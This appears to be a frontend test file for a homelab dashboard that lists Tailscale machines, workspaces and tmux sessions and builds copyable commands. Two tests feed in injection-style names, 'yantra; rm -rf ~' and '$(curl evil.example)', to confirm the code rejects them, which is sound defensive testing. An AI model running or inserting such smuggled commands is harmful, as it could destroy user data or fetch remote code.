import { afterEach, describe, expect, it, vi } from 'vitest'
import {
  cleanup,
  fireEvent,
  render,
  renderHook,
  screen,
  waitFor,
} from '@testing-library/react'
import type { Looked, Machine, MachineSessions, Session, Workspace } from './api'
import {
  machineColumns,
  sessionColumns,
  sessionCommand,
  type SessionRow,
  workspaceColumns,
  workspaceCommand,
} from './columns'
import { Command } from './components/Command'
import { DataTable } from './components/DataTable'
import { Section } from './components/Section'
import { useLooked } from './useLooked'
import App from './App'

afterEach(() => {
  cleanup()
  vi.unstubAllGlobals()
})

function machine(overrides: Partial<Machine> = {}): Machine {
  return {
    name: 'cachyos-g14',
    dns_name: 'cachyos-g14.<tailnet>.ts.net.',
    os: 'linux',
    online: true,
    expired: false,
    last_seen: '2026-07-07T09:00:00Z',
    ...overrides,
  }
}

function stubFetch(answers: Record<string, Looked<unknown>>) {
  vi.stubGlobal(
    'fetch',
    vi.fn((path: string) =>
      Promise.resolve({ ok: true, json: () => Promise.resolve(answers[path]) }),
    ),
  )
}

describe('the looked envelope', () => {
  it('says nobody has looked rather than drawing an empty fleet', () => {
    render(
      <Section title="Machines" query={{ looked: 'never' }}>
        {() => <p>a table</p>}
      </Section>,
    )
    expect(screen.getByText('Not looked at yet.')).toBeTruthy()
    expect(screen.queryByText('a table')).toBeNull()
  })

  it('renders a failure as the error and never as a table', () => {
    render(
      <Section
        title="Workspaces"
        query={{ looked: 'failed', age_seconds: 3, error: 'tailscaled is down' }}
      >
        {() => <p>a table</p>}
      </Section>,
    )
    expect(screen.getByText('tailscaled is down')).toBeTruthy()
    expect(screen.queryByText('a table')).toBeNull()
  })

  it('keeps the newlines in a multi-line parse error', () => {
    const error =
      'invalid workspace file\nTOML parse error at line 3, column 9\n  |\n3 | machine =\n  |         ^\n'
    render(
      <Section title="Workspaces" query={{ looked: 'failed', age_seconds: 1, error }}>
        {() => <p>a table</p>}
      </Section>,
    )
    const rendered = screen.getByText(error, { trim: false, collapseWhitespace: false })
    expect(rendered.textContent).toBe(error)
  })
})

describe('the machines table', () => {
  it('leaves LAST SEEN blank while a machine is online', () => {
    const { container } = render(
      <DataTable
        columns={machineColumns}
        rows={[machine()]}
        rowKey={(row) => row.name}
        empty="no machines on this tailnet"
      />,
    )
    const cells = [...container.querySelectorAll('td')].map((cell) => cell.textContent)
    expect(cells).toEqual(['cachyos-g14', 'linux', 'online', ''])
  })

  it('composes the status sentence and does not fold an expired key into offline', () => {
    render(
      <DataTable
        columns={machineColumns}
        rows={[machine({ online: false, expired: true, last_seen: '4d ago' })]}
        rowKey={(row) => row.name}
        empty="no machines on this tailnet"
      />,
    )
    expect(screen.getByText('offline, key expired')).toBeTruthy()
    expect(screen.getByText('4d ago')).toBeTruthy()
  })
})

describe('the workspaces table', () => {
  it('renders a null startup as a blank cell, not the word none', () => {
    const workspace: Workspace = {
      name: 'yantra',
      machine: 'cachyos-g14',
      repo: '/home/<user>/Github/homelab/yantra',
      startup: null,
    }
    const { container } = render(
      <DataTable
        columns={workspaceColumns({ looked: 'never' })}
        rows={[workspace]}
        rowKey={(row) => row.name}
        empty="no workspaces yet"
      />,
    )
    const cells = [...container.querySelectorAll('td')].map((cell) => cell.textContent)
    expect(cells[3]).toBe('')
  })

  it('names the path a file goes in when the look succeeded and found nothing', () => {
    render(
      <DataTable
        columns={workspaceColumns({ looked: 'never' })}
        rows={[]}
        rowKey={(row) => row.name}
        empty="no workspaces yet — make one at ~/.config/yantra/workspaces/<name>.toml"
      />,
    )
    expect(
      screen.getByText(
        'no workspaces yet — make one at ~/.config/yantra/workspaces/<name>.toml',
      ),
    ).toBeTruthy()
  })
})

describe('the sessions section', () => {
  const session: Session = {
    name: 'yantra',
    windows: 2,
    // A client count: 0 is detached, and rendering it as "no" would be a lie.
    attached: 0,
    created: 'Thu Jul 30 13:02:31 2026',
  }
  const answers: MachineSessions[] = [
    { machine: 'cachyos-g14', reached: 'yes', sessions: [session] },
    { machine: 'pi', reached: 'no', error: 'connection timed out' },
  ]

  it('renders an unanswered machine as unreachable and not as zero sessions', async () => {
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': { looked: 'never' },
      '/api/sessions': { looked: 'ok', age_seconds: 6, data: answers },
    })
    render(<App />)

    expect(await screen.findByText('pi unreachable: connection timed out')).toBeTruthy()
    expect(screen.getByText('1 session on 1 of 2 machines')).toBeTruthy()
    expect(screen.queryByText('pi')).toBeNull()
  })

  it('renders attached as the client count rather than a yes or no', () => {
    const { container } = render(
      <DataTable
        columns={sessionColumns({ looked: 'never' })}
        rows={[{ machine: 'cachyos-g14', session }]}
        rowKey={(row) => row.machine}
        empty="no tmux sessions"
      />,
    )
    const cells = [...container.querySelectorAll('td')].map((cell) => cell.textContent)
    expect(cells).toEqual([
      'cachyos-g14',
      'yantra',
      '2',
      '0',
      'Thu Jul 30 13:02:31 2026',
      '',
    ])
  })
})

describe('useLooked', () => {
  it('maps a rejected fetch into a failed look rather than throwing', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(() => Promise.reject(new Error('daemon is not running'))),
    )
    const { result } = renderHook(() => useLooked('/api/machines'))

    await waitFor(() => expect(result.current.looked).toBe('failed'))
    expect(result.current).toMatchObject({
      looked: 'failed',
      error: expect.stringContaining('daemon is not running'),
    })
  })

  it('maps a non-200 into a failed look, since the fleet answers 200 either way', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(() => Promise.resolve({ ok: false, status: 404 })),
    )
    const { result } = renderHook(() => useLooked('/api/machines'))

    await waitFor(() => expect(result.current.looked).toBe('failed'))
    expect(result.current).toMatchObject({ error: expect.stringContaining('404') })
  })

  it('answers never before the first response', () => {
    stubFetch({ '/api/machines': { looked: 'ok', age_seconds: 0, data: [] } })
    const { result } = renderHook(() => useLooked('/api/machines'))
    expect(result.current).toEqual({ looked: 'never' })
  })
})

describe('the age reading', () => {
  const aged = (age_seconds: number) =>
    render(
      <Section title="Machines" query={{ looked: 'ok', age_seconds, data: [] }}>
        {() => <p>a table</p>}
      </Section>,
    )

  it('says how old a fresh reading is and claims nothing else', () => {
    aged(6)
    expect(screen.getByText('looked 6s ago')).toBeTruthy()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })

  // 30 s of sleep plus the one ConnectTimeout a concurrent sweep can pay.
  it('reads a sweep that waited out an unreachable machine as normal', () => {
    aged(40)
    expect(screen.getByText('looked 40s ago')).toBeTruthy()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })

  it('says the refresh did not finish rather than that the data is old', () => {
    aged(73)
    expect(screen.getByText('looked 73s ago')).toBeTruthy()
    expect(screen.getByText('refresh stuck')).toBeTruthy()
  })

  it('does not call a daemon that has never looked stale', () => {
    render(
      <Section title="Machines" query={{ looked: 'never' }}>
        {() => <p>a table</p>}
      </Section>,
    )
    expect(screen.queryByText(/looked \d+s ago/)).toBeNull()
    expect(screen.queryByText('refresh stuck')).toBeNull()
  })
})

describe('the command a row carries', () => {
  function ok<T>(data: T): Looked<T> {
    return { looked: 'ok', age_seconds: 2, data }
  }

  const yantra: Workspace = {
    name: 'yantra',
    machine: 'cachyos-g14',
    repo: '/home/<user>/Github/homelab/yantra',
    startup: null,
  }
  const session: Session = {
    name: 'yantra',
    windows: 1,
    attached: 0,
    created: 'Thu Jul 30 13:02:31 2026',
  }
  const row: SessionRow = { machine: 'cachyos-g14', session }
  const running = ok<MachineSessions[]>([
    { machine: 'cachyos-g14', reached: 'yes', sessions: [session] },
  ])

  it('offers attach only when the session was really seen', () => {
    expect(workspaceCommand(yantra, running)).toBe('yantra attach yantra')

    const idle = ok<MachineSessions[]>([
      { machine: 'cachyos-g14', reached: 'yes', sessions: [] },
    ])
    expect(workspaceCommand(yantra, idle)).toBe('yantra up yantra')
  })

  it('offers up when the sessions are unknown, since not knowing is not knowing', () => {
    const failed: Looked<MachineSessions[]> = {
      looked: 'failed',
      age_seconds: 1,
      error: 'tailscaled is down',
    }
    expect(workspaceCommand(yantra, failed)).toBe('yantra up yantra')
    expect(workspaceCommand(yantra, { looked: 'never' })).toBe('yantra up yantra')
  })

  it('does not read an unreachable machine as a machine with no session', () => {
    const unreachable = ok<MachineSessions[]>([
      { machine: 'cachyos-g14', reached: 'no', error: 'connection timed out' },
    ])
    expect(workspaceCommand(yantra, unreachable)).toBe('yantra up yantra')
  })

  it('refuses a name the daemon would not have allowed rather than quoting it', () => {
    expect(workspaceCommand({ ...yantra, name: 'yantra; rm -rf ~' }, running)).toBeNull()
    expect(workspaceCommand({ ...yantra, name: '../escape' }, running)).toBeNull()
    expect(workspaceCommand({ ...yantra, name: '' }, running)).toBeNull()
  })

  it('builds a session row command from the workspace name, never from tmux', () => {
    expect(sessionCommand(row, ok([yantra]))).toBe('yantra attach yantra')

    const hostile: SessionRow = {
      machine: 'cachyos-g14',
      session: { ...session, name: '$(curl evil.example)' },
    }
    expect(sessionCommand(hostile, ok([yantra]))).toBeNull()
  })

  it('does not match a workspace of the same name on another machine', () => {
    const elsewhere: SessionRow = { ...row, machine: 'bishwajeets-macbook-pro' }
    expect(sessionCommand(elsewhere, ok([yantra]))).toBeNull()
    expect(sessionCommand(row, { looked: 'never' })).toBeNull()
  })

  it('puts the command in the row, and leaves the machines table without one', () => {
    render(
      <DataTable
        columns={workspaceColumns(running)}
        rows={[yantra]}
        rowKey={(one) => one.name}
        empty="no workspaces yet"
      />,
    )
    expect(screen.getByText('yantra attach yantra')).toBeTruthy()
    expect(machineColumns.some((column) => column.header === 'COMMAND')).toBe(false)
  })
})

describe('copying a command', () => {
  afterEach(() => {
    Reflect.deleteProperty(navigator, 'clipboard')
  })

  it('selects the command and says so on the origin the daemon actually serves', async () => {
    // jsdom offers neither navigator.clipboard nor execCommand, which is what a
    // plain-HTTP 100.64.0.0/10 address looks like: not a secure context.
    render(<Command command="yantra up yantra" />)
    fireEvent.click(screen.getByRole('button'))

    expect(await screen.findByText('selected — copy it yourself')).toBeTruthy()
    expect(window.getSelection()?.toString()).toBe('yantra up yantra')
  })

  it('writes the command itself when a secure context grants a clipboard', async () => {
    const writeText = vi.fn(() => Promise.resolve())
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText },
      configurable: true,
    })

    render(<Command command="yantra attach yantra" />)
    fireEvent.click(screen.getByRole('button'))

    expect(await screen.findByText('copied')).toBeTruthy()
    expect(writeText).toHaveBeenCalledWith('yantra attach yantra')
  })
})
